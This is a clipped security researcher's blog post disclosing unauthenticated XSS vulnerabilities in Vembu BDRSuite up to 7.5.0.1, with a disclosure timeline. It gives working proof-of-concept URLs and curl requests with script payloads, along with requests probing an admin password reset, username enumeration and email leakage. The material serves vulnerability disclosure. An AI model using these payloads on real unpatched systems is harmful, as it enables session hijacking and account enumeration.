---
title: "Vembu BDRSuite: Unauth XSS, Weird Endpoints and Silent Patches (≤ 7.5.0.1) - Chocapikk's Cybersecurity Blog"
source: https://chocapikk.com/posts/2025/bdrsuite/
source_host: chocapikk.com
clip_date: 2026-09-24T10:24:40+08:00
trace_id: ddcc967f-a870-4e50-b074-3e68f8c5577e
content_hash: 6c1292edb25a8953662c5972cc6c989a434a230d9d19313ce0132026f3154b85
status: synced
tags:
  - 漏洞分析
  - 安全工具
series: null
feed_source: Chocapikk·漏洞/Android RE
ai_summary: Vembu BDRSuite ≤7.5.0.1 存在两个未授权 XSS（CVE-2025-30007/30008），另有多个未修复或静默修补的疑似问题。
ai_summary_style: key-points
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 3e575244-d011-8158-8a2e-d3fc9e8b5e65
ioc:
  cves:
    - CVE-2024-48248
    - CVE-2025-30007
    - CVE-2025-30008
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> Vembu BDRSuite ≤7.5.0.1 存在两个未授权 XSS（CVE-2025-30007/30008），另有多个未修复或静默修补的疑似问题。
> 
> - **CVE-2025-30007：** `serverbackupprogress.sgp` 未过滤 GET/POST 参数，`ClientNameSel`/`BackupName` 直接拼进 `loadXMLDoc()` 造成 DOM 型 XSS，`grpName` 在 `dodeleteclientbackup.sgp` 回显造成注入。
> - **CVE-2025-30008：** `restoreprogress.sgp` 的 `mn`、`rnm`、`isRepliRestore`、`rusr`、`rpwd` 全部原样反射进 HTML，未授权即可完全控制页面 DOM。
> - **无 CVE 项：** `api.php?Action=getloginstate` 的 `name` 参数反射型 XSS（7.1.x 存在，7.1.x–7.6.0 间被静默修复）；`CheckUserExists` 通过返回 `EXISTS%`/`NOT_EXISTS%` 枚举用户名；`ResellerSetPassword` 疑似可未授权重置 admin 密码但无实际效果；`SignupCustomer` 会在响应中明文回显已注册邮箱。
> - **影响：** 两个 XSS 均无需认证，可在已登录用户上下文执行 JS，导致会话劫持或界面篡改；部分 Docker 构建下受影响页面未登录即可访问。
> - **时间线：** 2024-08 发现；2025-02-28 提交报告（ticket #745222），支持方称已在并不存在的“8.0”修复；2025-04-15 二次跟进后确认 7.6.0 已修复并分配 CVE。

![Vembu BDRSuite: Unauth XSS, Weird Endpoints and Silent Patches (≤ 7.5.0.1)](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/48dfd0dc334fbc59.jpg)

## Introduction

[Vembu BDRSuite](https://www.bdrsuite.com/) is an all-in-one backup and disaster recovery solution designed to protect virtual, physical, cloud, and SaaS workloads. It targets small and medium businesses as well as managed service providers (MSPs), offering centralized backup management for VMware, Hyper-V, Windows/Linux servers, Microsoft 365, Google Workspace, and more. BDRSuite provides features such as instant recovery, replication, ransomware protection, and flexible deployment (on-prem or cloud).

In August 2024, I started digging into BDRSuite as part of a personal initiative to audit backup platforms, something I had already done earlier that year with Vinchin, where I found interesting results. I also took a look at Nakivo during that period but didn’t find anything conclusive.

This blog post documents the outcome of my research on Vembu BDRSuite. It includes two unauthenticated XSS vulnerabilities that I reported and got patched (CVE-2025-30007 and CVE-2025-30008), and a few other leads, some of which were likely fixed before I had a chance to fully exploit them.

Also, props to the team at WatchTowr for their outstanding work on Nakivo. While I didn’t find anything myself during my tests, their research on this product uncovered several impactful vulnerabilities and definitely raised the bar for backup software audits. Their work was one of the things that motivated me to explore this space further. For a detailed analysis, refer to their blog post: [The Best Security Is When We All Agree To Keep Everything Secret (Except The Secrets) – NAKIVO Backup & Replication (CVE-2024-48248)](https://labs.watchtowr.com/the-best-security-is-when-we-all-agree-to-keep-everything-secret-except-the-secrets-nakivo-backup-replication-cve-2024-48248/).

## CVE-2025-30007 – Unauthenticated XSS in serverbackupprogress.sgp

### Description

This page includes multiple JavaScript-based interactions using unsanitized values derived from GET and POST parameters. Two separate XSS vulnerabilities exist:

-   A DOM-based injection via URL parameters embedded into `loadXMLDoc()`.
-   A POST-based injection via `grpName`, used in a `POST` call to `dodeleteclientbackup.sgp`.

### DOM-based XSS (loadXMLDoc)

```javascript
loadXMLDoc("<?php echo $SG_ROOT_PATH; ?>http/reloadserverbackup.sgp?from=1&cn=" + '<?php echo $ClientNameSel; ?>' + "&bn=" + '<?php echo $BackupName; ?>' + "&mn=" + '<?php echo $machineNameToConnect; ?>' + "&pn=" + '<?php echo $portNumber; ?>');
```

Parameters like `ClientNameSel` and `BackupName` are injected directly into the DOM as JavaScript string interpolations, making them vulnerable to XSS.

#### GET-based PoC

```plaintext
http://localhost:6060/templates/progress/serverside/serverbackupprogress.sgp?ClientName=<script>alert("XSS")</script>&BackupName=test&clusterIP=127.0.0.1&portNumber=6060
```

### POST-based XSS (grpName)

Inside the same page, the `AbortBackup()` function creates a `POST` request to `dodeleteclientbackup.sgp`, and the `grpName` parameter is rendered back into the page without escaping, leading to XSS.

#### POST-based PoC

```bash
curl -k -X POST "http://localhost:6060/server/dodeleteclientbackup.sgp" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "grpName=<script>alert('XSS')</script>&bkupName=test&jobAction=2&abort=1&clusterIP=127.0.0.1&portNumber=6060"
```

This payload is rendered and executed within the context of `serverbackupprogress.sgp`, confirming a classic stored/reflected XSS depending on the server logic.

### Impact

These issues allow an unauthenticated attacker to inject and execute JavaScript in the context of a logged-in user, leading to session hijacking or UI manipulation. Since the affected page is exposed under certain Docker builds without login, this can be weaponized.

## CVE-2025-30008 – Unauthenticated XSS in restoreprogress.sgp

### Description

In `restoreprogress.sgp`, nearly all parameters from the URL are reflected in the HTML without proper sanitization.

### Affected Parameters

-   `mn`
-   `rnm`
-   `isRepliRestore`
-   `rusr`
-   `rpwd`

### GET-based PoC

```plaintext
http://localhost:6060/templates/progress/clientside/restoreprogress.sgp?mn=<script>alert('XSS')</script>&rnm=testRestoreJob&isRepliRestore=0&rusr=<script>alert('XSS')</script>&rpwd=secretPassword
```

### Impact

Exploiting this endpoint grants an attacker full control over the page’s DOM. This could lead to session theft or further internal exploitation, again, without authentication.

## Reflected XSS in getloginstate (No CVE)

I discovered this in version 7.1.x. The `name` parameter is directly reflected in the HTML without encoding:

```plaintext
https://localhost/api.php?Action=getloginstate&browser=Firefox&name=<script>alert('XSS')</script>
```

It appears to have been fixed somewhere between version 7.1.x and 7.6.0, but I have no idea when exactly. I didn’t submit a CVE since it was already resolved by the time I re-tested.

## Password Reset via ResellerSetPassword (Unexploited Logic)

One of the weirder behaviors: the following unauthenticated `POST` request appears to reset the admin’s password:

```bash
curl -k -X POST "https://localhost/api.php" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "Action=ResellerSetPassword&username=admin&temppass=NewSuperPass123&userFirstName=Hacker&userLastName=Exploit"
```

And yet the response says:

```xml
<StoreGrid><Authentication Status="success" Message="" Code="500" ValidationErrorCode="0" /></StoreGrid>
```

The mix of `Status="success"` with `Code="500"` is sketchy. My assumption is that the request wasn’t properly handled server-side, or maybe I was just using it wrong. Either way, the endpoint didn’t actually update anything observable.

To be honest, at that point I was drowning in undocumented behaviors, weird permission scopes, and payloads longer than a Skibidi boss fight. Every request felt like casting a spell and hoping for the best. After hours of poking around with zero consistent results, I closed my terminal and accepted defeat.

Still, I’m leaving the trace here in case someone else wants to dig.

## Username Enumeration via CheckUserExists

This classic user enumeration endpoint:

```bash
curl -k -X POST "https://localhost/sgwebservice.php" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "Action=CheckUserExists&UserName=admin"
```

Returns:

```plaintext
EXISTS%
```

Whereas non-existent names return:

```plaintext
NOT_EXISTS%
```

This behavior was available in 7.1.x and quietly removed in later versions. I didn’t file a CVE because I couldn’t chain it with anything exploitable.

## Suspicious Behavior in SignupCustomer

This one is odd. Submitting what appears to be a duplicate email via `SignupCustomer` yields this:

```bash
curl -k -X POST "https://localhost/sgwebservice.php" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     --data-urlencode "Action=SignupCustomer" \
     --data-urlencode "CustomerName=NewCompany" \
     --data-urlencode "ResellerName=ExistingReseller" \
     --data-urlencode "EMail=balgogan@protonmail.com" \
     --data-urlencode "Address=123 Street Name" \
     --data-urlencode "City=CyberCity" \
     --data-urlencode "Phone=+1234567890" \
     --data-urlencode "Fax=+0987654321" \
     --data-urlencode "ActivationStatus=1" \
     --data-urlencode "AutoAuthorizationStatus=1" \
     --data-urlencode "TrialStatus=0" \
     --data-urlencode "EnableWebAccess=1" \
     --data-urlencode "StorageLocation=/var/storage" \
     --data-urlencode "StorageAllotted=500000000" \
     --data-urlencode "EnableAutoSpace=1" \
     --data-urlencode "EnableConsolidatedReport=1" \
     --data-urlencode "UpdatePeriod=7" \
     --data-urlencode "ConsolidatedReportEmail=reports@example.com" \
     --data-urlencode "WebUserName=vembu" \
     --data-urlencode "WebPassword=SuperSecurePass123" \
     --data-urlencode "WebPortalPassword=SuperSecurePass123" \
     --data-urlencode "UserName=testadmin" \
     --data-urlencode "Password=SuperSecurePass123" \
     --data-urlencode "PortalUserName=customer@example.com" \
     --data-urlencode "groupRoleID=2" \
     --data-urlencode "parentGroupID=1" \
     --data-urlencode "parentGroupRoleID=5" \
     --data-urlencode "groupStatus=1" \
     --data-urlencode "groupAuth=1" \
     --data-urlencode "IsGlobalConfiguration=1" \
     --data-urlencode "IsThrottleEnable=0" \
     --data-urlencode "RestrictedRate=1048576" \
     --data-urlencode "AlwaysThrottle=1" \
     --data-urlencode "ActiveFrom=0900" \
     --data-urlencode "ActiveTill=2100" \
     --data-urlencode "IsAutoMSPEU=1" \
     --data-urlencode "AllotMSPEU=10" \
     --data-urlencode "SendMail=1"
```

Response:

```xml
<StoreGrid><Message Error="" Message="" Code="500" ErrCode="278" PortalUserName="balgogan@protonmail.com" WebPortalPassword="" ResellerEmail="" CustomerEmail="balgogan@protonmail.com" EmailStatus=""/></StoreGrid>
```

It returns the previously registered email in plaintext, but no actionable exploit was found. Possibly broken logic, possibly just poor error handling.

## Timeline

-   **August 2024** – Initial discovery of unauthenticated XSS in `.sgp` files during backup software testing.
-   **February 28, 2025** – Full vulnerability report submitted to BDRSuite support (ticket **#745222**).
-   **Same day** – Support replies stating the issues were already fixed in “version 8.0” (a version that doesn’t exist).
-   **March 13, 2025** – CVE requests for the two XSS vulnerabilities submitted via VulnCheck.
-   **April 15, 2025** – I open a second support ticket (**#762326**) after weeks without any update.
-   **April 15, 2025** – Support responds, apologizes, and says the original ticket was closed “by accident”.
-   **April 15, 2025** – Confirmation that both XSS vulnerabilities are fixed in **version 7.6.0**, released the same day.
-   **April 2025** – CVE-2025-30007 and CVE-2025-30008 are officially assigned and published.

## Final Thoughts

Some bugs were impactful. Others were weird dead-ends. But I wanted to avoid a situation where issues get patched silently, so I took the time to write this. If you’re exploring older versions of BDRSuite, or curious about legacy script-based attack surfaces, this might help you dig further.
